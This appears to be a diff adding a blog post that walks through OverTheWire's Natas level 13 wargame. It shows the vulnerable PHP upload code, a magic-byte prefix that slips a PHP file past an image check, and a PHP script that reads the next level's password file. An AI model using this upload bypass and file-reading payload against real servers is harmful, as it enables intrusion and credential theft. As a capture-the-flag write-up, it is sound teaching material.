@@ -100,7 +100,170 @@
       
 
 
-        
+        <div id="main">
+          <div id="content">
+            <div>
+              <article class="hentry" role="article">
+
+                
+                
+
+                <div class="entry-content">
+                  
+                  
+                  <p><a href="http://www.overthewire.org/wargames/natas/natas13.shtml">Level 13</a> of <a href="http://www.overthewire.org">OverTheWire&rsquo;s</a> Natas wargame is extremely similar to Level 12. The only difference now, is that it&rsquo;s validating that the file is in fact an image. This however is flawed, as exif data can be faked.</p>
+
+<!-- more -->
+
+<p>It starts out with a similar upload prompt as last time.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/natas13_1.png" />
+    
+    
+</figure>
+
+
+<p>The source code is super similar to last time.</p>
+
+<pre><code>&lt;html&gt; 
+&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&gt;&lt;/head&gt; 
+&lt;body&gt; 
+&lt;h1&gt;natas13&lt;/h1&gt; 
+&lt;div id=&quot;content&quot;&gt; 
+For security reasons, we now only accept image files!&lt;br/&gt;&lt;br/&gt; 
+
+&lt;?  
+
+function genRandomString() { 
+    $length = 10; 
+    $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;; 
+    $string = &quot;&quot;;     
+
+    for ($p = 0; $p &lt; $length; $p++) { 
+        $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
+    } 
+
+    return $string; 
+} 
+
+function makeRandomPath($dir, $ext) { 
+    do { 
+    $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext; 
+    } while(file_exists($path)); 
+    return $path; 
+} 
+
+function makeRandomPathFromFilename($dir, $fn) { 
+    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
+    return makeRandomPath($dir, $ext); 
+} 
+
+if(array_key_exists(&quot;filename&quot;, $_POST)) { 
+    $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]); 
+
+
+        if(filesize($_FILES['uploadedfile']['tmp_name']) &gt; 1000) { 
+        echo &quot;File is too big&quot;; 
+    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
+        echo &quot;File is not an image&quot;; 
+    } else { 
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
+            echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;
+        } else{ 
+            echo &quot;There was an error uploading the file, please try again!&quot;; 
+        } 
+    } 
+} else { 
+?&gt; 
+
+&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt; 
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt; 
+&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt; 
+Choose a JPEG to upload (max 1KB):&lt;br/&gt; 
+&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt; 
+&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt; 
+&lt;/form&gt; 
+&lt;? } ?&gt; 
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; 
+&lt;/div&gt; 
+&lt;/body&gt; 
+&lt;/html&gt; 
+</code></pre>
+
+<p>Just like last time, I saved the HTML down to my local machine, and made 2 changes, for the url, and the filename.</p>
+
+<pre><code>&lt;html&gt;
+&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas13&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+For security reasons, we now only accept image files!&lt;br/&gt;&lt;br/&gt;
+
+
+&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;http://natas13.natas.labs.overthewire.org/index.php&quot; method=&quot;POST&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;file.php&quot; /&gt;
+Choose a JPEG to upload (max 1KB):&lt;br/&gt;
+&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;
+&lt;/form&gt;
+&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>The main difference to get around the exif changing in this case, is to put the JPEG magic-bytes into the beginning of the file. I found the JPEG magic-bytes by simply googling the <a href="http://www.digitalpreservation.gov/formats/fdd/fdd000018.shtml">JPEG</a> file format</a>.</p>
+
+<p>I first created a small file that contained the magic bytes.</p>
+
+<pre><code>mandreko$ echo -e &quot;\xff\xd8\xff\xe0&quot; &gt; jpeg_magic
+</code></pre>
+
+<p>Next, I created my PHP script to upload (same as last level, except a new file to read).</p>
+
+<pre><code>&lt;?php
+$file = file_get_contents('/etc/natas_webpass/natas14');
+echo &quot;\n&quot; . $file;
+?&gt;
+</code></pre>
+
+<p>Then to combine these files, I just used &ldquo;cat&rdquo;.</p>
+
+<pre><code>mandreko$ cat jpeg_magic upload.php &gt; upload2.php
+</code></pre>
+
+<p>I then uploaded &ldquo;upload2.php&rdquo; using my local HTML form that I created.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/natas13_2.png" />
+    
+    
+</figure>
+
+
+<p>Just like that, it let me past the logic to verify it was an image type. Once I clicked on the link to the uploaded file, it showed me the magic-bytes, followed by the password to the next level.</p>
+
+
+<figure class="img-responsive">
+    
+        <img src="/img/natas13_3.png" />
+    
+    
+</figure>
+
+
+                </div>
+                
+              </article>
+            </div>
+          </div>
+        </div>
 
 
       
@@ -184,15 +347,8 @@
 		<span class="labelpost" data-label="Magazine" data-no="4"></span>
 	</div>
 	<div class='clear'></div>
-	<span class='widget-item-control'>
-		<span class='item-control blog-admin'>
-			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
-				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
-			</a>
-		</span>
-	</span>
-	<div class='clear'></div>
 </div>
+
         <div class='widget Label' data-version='1' id='Label1'>
 	<h2>Categories</h2>
 	<div class='widget-content cloud-label-widget-content'>
@@ -637,3 +793,4 @@
 		
 	</body>
 </html>
+
